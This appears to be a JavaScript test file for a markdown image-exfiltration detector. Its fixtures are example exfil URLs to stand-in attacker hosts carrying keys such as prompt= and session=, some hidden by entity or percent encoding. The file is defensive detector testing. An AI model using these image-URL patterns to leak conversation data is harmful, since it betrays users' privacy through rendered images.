// =============================================================
//  Shield Scanner Web — S18 md-exfil v1.9.0 threshold harness
// =============================================================
// Pins the v1.9.0 markdown-image-exfil host-tier asymmetry on the Web side.
// detectMarkdownExfil() lives in @shield-scanner/core, which the Web bundle
// inlines verbatim — so Node-side `core` direct-import is the cheapest way
// to exercise the exact same logic the browser runs (no DOMParser, no esbuild
// run needed). This mirrors test-s10-csv.mjs's approach.
//
// Coverage (mirrors packages/core/test/md-exfil-threshold.test.js but framed
// as the Web-relevant scenarios — host-tier matrix + R12 invariants):
//
//   1.  imageOnly host (i.imgur.com)             + weak  -> SAFE
//   2.  imageOnly host suffix (foo.cdn.jsdelivr) + weak  -> SAFE
//   3.  userContent exact (notion.so)            + weak  -> SAFE
//   4.  userContent subdomain (attacker.notion.so) + weak -> WARN
//   5.  userContent subdomain + strong                    -> DANGER
//   6.  unknown host + 1 weak (v1.9.0 NEW)               -> WARN
//   7.  unknown host + 1 strong                          -> DANGER
//   8.  public IPv4 + weak (v1.9.0 split)                -> WARN
//   9.  public IPv4 + strong                             -> DANGER
//   10. private 192.168 + weak (v1.9.0 silent)           -> SAFE
//   11. private 192.168 + strong                         -> WARN
//   12. loopback ::1 + weak                              -> SAFE
//   13. demoted generic key 'data' alone                 -> SAFE (v1.9.0)
//   14. R12: technique stays fixed-phrase, host on meta
//   15. R13: position+matchLen slice contract preserved
//
// R18: no setEnv needed — detectMarkdownExfil() reads exfil-patterns.json
// through loadRule(), and Node's default env wires the fs rules-loader.
// =============================================================

import { detectMarkdownExfil } from '@shield-scanner/core';

const tests = [];
function add(name, run) { tests.push({ name, run }); }

function one(md) {
  const out = detectMarkdownExfil(md);
  if (out.length !== 1) {
    throw new Error(`expected 1 finding, got ${out.length}: ${JSON.stringify(out)}`);
  }
  return out[0];
}
function zero(md) {
  const out = detectMarkdownExfil(md);
  if (out.length !== 0) {
    throw new Error(`expected 0 findings, got ${out.length}: ${JSON.stringify(out)}`);
  }
}

// --- Tier-1 (imageOnlyHosts, suffix-safe) ---

add('1 imgur (imageOnly exact) + weak key -> SAFE (short-circuit)', () => {
  zero('![x](https://i.imgur.com/abc.png?session=preview)');
});

add('2 imageOnly suffix (foo.cdn.jsdelivr.net) + weak key -> SAFE', () => {
  zero('![x](https://foo.cdn.jsdelivr.net/npm/pkg/dist/x.png?session=A)');
});

// --- Tier-2 (userContentHosts, exact-only) ---

add('3 notion.so (userContent exact) + weak key -> SAFE', () => {
  zero('![n](https://notion.so/page/img.png?context=preview)');
});

add('4 attacker.notion.so (UC subdomain) + 1 weak key -> WARNING', () => {
  const f = one('![n](https://attacker.notion.so/page/img.png?session=abc)');
  if (f.severity !== 'warning') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (weak key)') {
    throw new Error(`technique=${f.technique}`);
  }
});

add('5 attacker.notion.so + strong key -> DANGER', () => {
  const f = one('![n](https://attacker.notion.so/page/img.png?prompt=leak)');
  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (strong key)') {
    throw new Error(`technique=${f.technique}`);
  }
});

// --- Unknown host ---

add('6 unknown host + 1 weak key (v1.9.0 NEW) -> WARNING', () => {
  const f = one('![x](http://attacker.example/p?session=hello)');
  if (f.severity !== 'warning') throw new Error(`severity=${f.severity}`);
  if (f.meta.weakHits !== 1) throw new Error(`weakHits=${f.meta.weakHits}`);
  if (f.meta.matchedKey !== 'session') throw new Error(`matchedKey=${f.meta.matchedKey}`);
});

add('7 unknown host + 1 strong key -> DANGER', () => {
  const f = one('![x](http://attacker.example/p?prompt=PAYLOAD)');
  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
});

// --- Public IP literal ---

add('8 public IPv4 + 1 weak key (v1.9.0 split) -> WARNING', () => {
  const f = one('![x](http://203.0.113.42/c?session=abc)');
  if (f.severity !== 'warning') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (public IP host)') {
    throw new Error(`technique=${f.technique}`);
  }
  if (f.meta.ipKind !== 'public') throw new Error(`ipKind=${f.meta.ipKind}`);
});

add('9 public IPv4 + 1 strong key -> DANGER', () => {
  const f = one('![x](http://203.0.113.42/c?prompt=ignore)');
  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (public IP host)') {
    throw new Error(`technique=${f.technique}`);
  }
});

// --- Private / loopback IP ---

add('10 private 192.168.x + 1 weak key (v1.9.0) -> SAFE (silent)', () => {
  zero('![x](http://192.168.1.10/c?session=abc)');
});

add('11 private 192.168.x + strong key -> WARNING', () => {
  const f = one('![x](http://192.168.1.10/c?prompt=ignore)');
  if (f.severity !== 'warning') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (private IP host)') {
    throw new Error(`technique=${f.technique}`);
  }
});

add('12 loopback ::1 + 1 weak key -> SAFE (silent, mirrors IPv4 private)', () => {
  zero('![x](http://[::1]/c?session=abc)');
});

// --- Demoted generic key handling ---

add("13 'data' alone is demoted (v1.9.0) -> SAFE on unknown host", () => {
  zero('![x](http://attacker.example/p?data=hello)');
});

// --- R12 / R13 invariants ---

add('14 R12: weak-key technique stays fixed-phrase; host/key on meta only', () => {
  const f = one('![x](http://evil-host.example/c?session=PAYLOAD-STR)');
  if (f.technique.includes('evil-host.example')) {
    throw new Error('technique leaks host');
  }
  if (f.technique.includes('PAYLOAD-STR')) {
    throw new Error('technique leaks value');
  }
  if (f.technique.includes('session')) {
    throw new Error('technique leaks key name');
  }
  if (f.meta.host !== 'evil-host.example') {
    throw new Error(`meta.host=${f.meta.host}`);
  }
  if (f.meta.matchedKey !== 'session') {
    throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
  }
});

add('15 R13: position+matchLen slice contract preserved (weak path)', () => {
  const url = 'http://attacker.example/p?session=hello';
  const md = `![alt](${url})`;
  const f = one(md);
  const slice = md.slice(f.position, f.position + f.matchLen);
  if (slice !== url) {
    throw new Error(`slice mismatch: expected ${JSON.stringify(url)}, got ${JSON.stringify(slice)}`);
  }
});

// --- v1.10.0 Theme A: 3-path parity ---
//
// Same URL via inline / reference / html-img must yield identical
// {severity, technique, meta.host, meta.matchedKey}. classifyUrl() is shared
// across all 4 detector passes — this pin guards against future per-pass
// drift on the Web (browser-bundle) side.

add('16 Theme A: 3-path parity (inline/ref-image/html-img) — same verdict', () => {
  const url = 'http://attacker.example/?prompt=PAYLOAD';
  const inlineFs = detectMarkdownExfil(`![alt](${url})`);
  const refFs = detectMarkdownExfil(`![alt][r]\n\n[r]: ${url}`);
  const htmlFs = detectMarkdownExfil(`<img src="${url}" />`);
  if (inlineFs.length !== 1 || refFs.length !== 1 || htmlFs.length !== 1) {
    throw new Error(`expected 1 finding per path; got inline=${inlineFs.length} ref=${refFs.length} html=${htmlFs.length}`);
  }
  const [i, r, h] = [inlineFs[0], refFs[0], htmlFs[0]];
  if (i.element !== 'md-image') throw new Error(`inline element=${i.element}`);
  if (r.element !== 'md-image-ref') throw new Error(`ref element=${r.element}`);
  if (h.element !== 'html-img') throw new Error(`html element=${h.element}`);
  for (const f of [i, r, h]) {
    if (f.severity !== 'danger') throw new Error(`severity=${f.severity} on ${f.element}`);
    if (f.technique !== 'Markdown image exfiltration (strong key)') {
      throw new Error(`technique=${f.technique} on ${f.element}`);
    }
    if (f.meta.host !== 'attacker.example') throw new Error(`meta.host=${f.meta.host} on ${f.element}`);
    if (f.meta.matchedKey !== 'prompt') throw new Error(`meta.matchedKey=${f.meta.matchedKey} on ${f.element}`);
  }
});

// --- v1.11.0 Theme B: extended 3-path parity coverage ---
//
// v1.10.0 pinned parity on the canonical danger case (strong key on unknown
// host). v1.11.0 widens that pin to the *full* host-tier matrix: weak-key,
// public-IP, and safe-host short-circuit must all produce identical
// {severity, technique, meta.host, meta.matchedKey} across inline /
// reference-image / html-img dispatch paths.

add('17 Theme B: 3-path parity on WEAK-key path (unknown host)', () => {
  // weak>=1 on unknown host -> warning. All three shapes share classifyUrl()
  // so the verdict must match.
  const url = 'http://attacker.example/p?session=demo';
  const inlineFs = detectMarkdownExfil(`![alt](${url})`);
  const refFs = detectMarkdownExfil(`![alt][r]\n\n[r]: ${url}`);
  const htmlFs = detectMarkdownExfil(`<img src="${url}" alt="x">`);
  if (inlineFs.length !== 1 || refFs.length !== 1 || htmlFs.length !== 1) {
    throw new Error(`expected 1 finding per path; got inline=${inlineFs.length} ref=${refFs.length} html=${htmlFs.length}`);
  }
  for (const f of [inlineFs[0], refFs[0], htmlFs[0]]) {
    if (f.severity !== 'warning') throw new Error(`severity=${f.severity} on ${f.element}`);
    if (f.technique !== 'Markdown image exfiltration (weak key)') {
      throw new Error(`technique=${f.technique} on ${f.element}`);
    }
    if (f.meta.host !== 'attacker.example') throw new Error(`meta.host=${f.meta.host} on ${f.element}`);
    if (f.meta.matchedKey !== 'session') throw new Error(`meta.matchedKey=${f.meta.matchedKey} on ${f.element}`);
  }
});

add('18 Theme B: 3-path parity on PUBLIC-IP path + weak key -> warning', () => {
  // Public IP literal + 1 weak key. v1.9.0 host-tier matrix mandates warning
  // (was danger pre-v1.9.0). All three shapes must agree.
  const url = 'http://203.0.113.42/c?context=PAYLOAD';
  const inlineFs = detectMarkdownExfil(`![alt](${url})`);
  const refFs = detectMarkdownExfil(`![alt][r]\n\n[r]: ${url}`);
  const htmlFs = detectMarkdownExfil(`<img src="${url}" alt="x">`);
  if (inlineFs.length !== 1 || refFs.length !== 1 || htmlFs.length !== 1) {
    throw new Error(`expected 1 finding per path; got inline=${inlineFs.length} ref=${refFs.length} html=${htmlFs.length}`);
  }
  for (const f of [inlineFs[0], refFs[0], htmlFs[0]]) {
    if (f.severity !== 'warning') throw new Error(`severity=${f.severity} on ${f.element}`);
    if (f.technique !== 'Markdown image exfiltration (public IP host)') {
      throw new Error(`technique=${f.technique} on ${f.element}`);
    }
    if (f.meta.ipKind !== 'public') throw new Error(`meta.ipKind=${f.meta.ipKind} on ${f.element}`);
  }
});

add('19 Theme B: 3-path parity on SAFE-HOST short-circuit (imageOnly suffix)', () => {
  // i.imgur.com is imageOnly Tier-1 — even a strong key MUST short-circuit
  // before classifyUrl() reaches the key counter. All three shapes -> SAFE.
  const url = 'https://i.imgur.com/abc.png?prompt=PAYLOAD';
  const inlineFs = detectMarkdownExfil(`![alt](${url})`);
  const refFs = detectMarkdownExfil(`![alt][r]\n\n[r]: ${url}`);
  const htmlFs = detectMarkdownExfil(`<img src="${url}" alt="x">`);
  if (inlineFs.length !== 0 || refFs.length !== 0 || htmlFs.length !== 0) {
    throw new Error(`expected 0 findings per path; got inline=${inlineFs.length} ref=${refFs.length} html=${htmlFs.length}`);
  }
});

// --- v1.12.0 Theme C: HTML img edge case negative pins ---
//
// Mirrors the +3 core tests (md-exfil-threshold.test.js) on the Web bundle
// side. Each input is currently *silent* in detectMarkdownExfil(); the test
// pins that silence so a future entity-decode or multiline-tolerant tokenizer
// change is caught here too. See core test for the full rationale per case.

add('20 v1.13.0: entity-encoded quotes around src URL -> WARNING (decode flip)', () => {
  // v1.12.0 LEFT this silent and pinned the silence. v1.13.0 flips: html-img
  // src is entity-decoded then re-classified; surrounding `"` are stripped.
  // The decoded URL has 1 weak key (session) on unknown host -> warning.
  // meta.entityDecoded === true marks the path.
  const f = one('<img src=&quot;https://attacker.example/p?session=A&quot;>');
  if (f.severity !== 'warning') throw new Error(`severity=${f.severity}`);
  if (f.element !== 'html-img') throw new Error(`element=${f.element}`);
  if (f.technique !== 'Markdown image exfiltration (weak key)') {
    throw new Error(`technique=${f.technique}`);
  }
  if (f.meta.host !== 'attacker.example') throw new Error(`meta.host=${f.meta.host}`);
  if (f.meta.matchedKey !== 'session') throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
  if (f.meta.entityDecoded !== true) throw new Error(`meta.entityDecoded=${f.meta.entityDecoded}`);
});

add('21 Theme C: circular ref-def `[a]: [a]` -> SAFE and does not infinite-loop', () => {
  // `[a]: [a]` captures url="[a]" which is not http(s); classifyUrl()
  // returns null. The detector does not re-resolve URL values as ref ids
  // so no recursion is possible. We still bound the call to 100ms in case
  // a future ref-def resolver decides to recurse.
  const md = '![a][a]\n\n[a]: [a]';
  const start = Date.now();
  const out = detectMarkdownExfil(md);
  const elapsed = Date.now() - start;
  if (out.length !== 0) {
    throw new Error(`expected 0 findings, got ${out.length}: ${JSON.stringify(out)}`);
  }
  if (elapsed >= 100) {
    throw new Error(`expected detector to finish in <100ms, took ${elapsed}ms`);
  }
});

add('22 v1.13.0: &amp;-joined strong-key params on unknown host -> DANGER', () => {
  // Raw URL parses but searchParams sees `safekey` (off-list) and
  // `amp;prompt` (off-list) -> raw verdict null. Entity decode flips
  // `&amp;` to `&` -> searchParams `safekey, prompt` -> 1 strong -> danger.
  // entityDecoded=true marks the path.
  const f = one('<img src="http://attacker.example/p?safekey=A&amp;prompt=B">');
  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (strong key)') {
    throw new Error(`technique=${f.technique}`);
  }
  if (f.meta.host !== 'attacker.example') throw new Error(`meta.host=${f.meta.host}`);
  if (f.meta.matchedKey !== 'prompt') throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
  if (f.meta.entityDecoded !== true) throw new Error(`meta.entityDecoded=${f.meta.entityDecoded}`);
});

add('23 v1.13.0: &amp;-joined params on i.imgur.com -> SAFE (host short-circuit post-decode)', () => {
  // Safety-net pin: safe-host short-circuit must apply on the decoded form
  // too. Even with weak / strong keys in the decoded query, i.imgur.com
  // (imageOnly Tier-1) silences before key counting.
  zero('<img src="https://i.imgur.com/abc.png?session=A&amp;chat=B&amp;context=C">');
});

// --- v1.15.0 Theme B: percent-decoded URL pre-pass ---
//
// classifyUrl() now runs a minimal percent-decode (6-char allowlist) when raw
// classification misses, and marks the verdict with meta.percentDecoded=true.
// Applies to all 3 image shapes. Composable with v1.13.0 entity-decode on
// the html-img path.

add('24 v1.15.0: %26-encoded strong key on unknown host -> DANGER (percentDecoded=true)', () => {
  // Raw `?a=A%26prompt=B`: URLSearchParams sees key "a" with value
  // "A&prompt=B" (literal `%26` becomes `&` only inside the value, the
  // separator stays "&" so there's only one key). 0 strong / 0 weak -> raw
  // miss. Percent-decode: `%26`->`&` -> 2 keys, `prompt` strong -> danger.
  const f = one('![x](http://attacker.example/p?a=A%26prompt=PAYLOAD)');
  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (strong key)') {
    throw new Error(`technique=${f.technique}`);
  }
  if (f.meta.host !== 'attacker.example') throw new Error(`meta.host=${f.meta.host}`);
  if (f.meta.matchedKey !== 'prompt') throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
  if (f.meta.percentDecoded !== true) throw new Error(`meta.percentDecoded=${f.meta.percentDecoded}`);
});

add('25 v1.15.0: %25 (encoded percent) NOT double-decoded -> SAFE', () => {
  // %25 is EXCLUDED from the allowlist to prevent double-decode bypass.
  // `?%2525prompt=X`: raw key is "%2525prompt" (since URLSearchParams
  // decodes %25->% giving "%25prompt"... actually let's keep simpler: the
  // allowlist contains NO entries that would expose `prompt` here, so
  // staying silent is the contract.
  zero('![x](http://attacker.example/p?%2525prompt=X)');
});

add('26 v1.15.0: combined entity + percent encoding on html-img -> BOTH flags set', () => {
  // Double-obfuscation: html-img raw misses (entity-encoded protocol);
  // entity-decoded form passes through classifyUrl() which runs the
  // percent-decode 2-pass. Final meta carries entityDecoded AND
  // percentDecoded. Pins the composability contract on the Web side.
  const f = one('<img src=&quot;http://attacker.example/p?a=A%26prompt=PAYLOAD&quot;>');
  if (f.severity !== 'danger') throw new Error(`severity=${f.severity}`);
  if (f.technique !== 'Markdown image exfiltration (strong key)') {
    throw new Error(`technique=${f.technique}`);
  }
  if (f.meta.matchedKey !== 'prompt') throw new Error(`meta.matchedKey=${f.meta.matchedKey}`);
  if (f.meta.entityDecoded !== true) throw new Error(`meta.entityDecoded=${f.meta.entityDecoded}`);
  if (f.meta.percentDecoded !== true) throw new Error(`meta.percentDecoded=${f.meta.percentDecoded}`);
});

add('27 v1.15.0: R12 — technique stays fixed-phrase; decoded URL never in technique/content', () => {
  // Even on the percent-decoded path, technique is one of 4 fixed phrases
  // and content echoes the RAW (still-encoded) URL — NOT the decoded form.
  const md = '![x](http://evil-pct.example/c?a=A%26prompt=PAYLOAD-LEAK)';
  const f = one(md);
  if (f.technique.includes('evil-pct.example')) {
    throw new Error('technique leaks host');
  }
  if (f.technique.includes('PAYLOAD-LEAK')) {
    throw new Error('technique leaks value');
  }
  if (f.technique.includes('prompt')) {
    throw new Error('technique leaks key name');
  }
  if (f.technique.includes('%26')) {
    throw new Error('technique leaks raw encoding');
  }
  if (f.meta.percentDecoded !== true) throw new Error(`meta.percentDecoded=${f.meta.percentDecoded}`);
  // R13: content echoes the RAW (encoded) URL — decoded form never reaches it.
  if (!f.content.includes('%26')) throw new Error('content lost raw encoding');
  if (f.content.includes('a=A&prompt')) throw new Error('content leaked decoded URL');
});

// ---- Runner ----

let passed = 0;
let failed = 0;

for (const t of tests) {
  try {
    t.run();
    passed++;
    console.log(`PASS ${t.name}`);
  } catch (err) {
    failed++;
    console.log(`FAIL ${t.name}`);
    console.log('       error:', err && err.message ? err.message : String(err));
  }
}

console.log(`\nTotal: ${passed} passed / ${failed} failed`);
process.exitCode = failed === 0 ? 0 : 1;
